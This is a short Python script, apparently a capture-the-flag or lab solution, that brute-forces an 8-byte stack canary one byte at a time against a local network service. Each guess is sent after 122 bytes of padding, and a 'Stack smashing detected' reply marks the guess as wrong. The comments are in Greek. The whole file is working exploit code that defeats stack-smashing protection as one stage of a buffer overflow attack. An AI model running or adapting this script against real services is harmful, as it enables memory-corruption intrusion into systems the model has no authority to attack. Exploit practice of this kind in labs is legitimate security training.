import socket
import time

def solve():
    host, port = '127.0.0.1', 28285
    padding = b"A" * 122
    known_canary = b""

    print("--- Starting Patient Brute-force (8 bytes) ---")

    for i in range(8):
        print(f"\nSearching for byte {i}: ", end="", flush=True)
        found = False
        
        for candidate in range(256):
            attempts = 0
            while attempts < 3: # Προσπάθησε 3 φορές για κάθε byte αν αποτύχει το δίκτυο
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.0) # Περισσότερος χρόνος για τον server
                    s.connect((host, port))
                    
                    payload = padding + known_canary + bytes([candidate])
                    s.sendall(payload)
                    
                    data = s.recv(1024)
                    s.close()

                    # Αν ο server απάντησε κανονικά και ΔΕΝ έβγαλε smashing
                    if b"Twit:" in data and b"Stack smashing detected" not in data:
                        known_canary += bytes([candidate])
                        print(f"[{hex(candidate)}]", end="", flush=True)
                        found = True
                        break
                    
                    # Αν απάντησε αλλά έβγαλε smashing, πάμε στον επόμενο candidate
                    break 

                except (socket.timeout, ConnectionRefusedError, OSError):
                    attempts += 1
                    time.sleep(1) # Περίμενε 1 δευτερόλεπτο αν "μπουκώσει"
            
            if found: break
            if candidate % 32 == 0: print(".", end="", flush=True) # visual progress

        if not found:
            print(f"\n[!] Failed to find byte {i} after all candidates.")
            break

    print(f"\n\nFINAL_CANARY: {known_canary.hex()}")

if __name__ == "__main__":
    solve()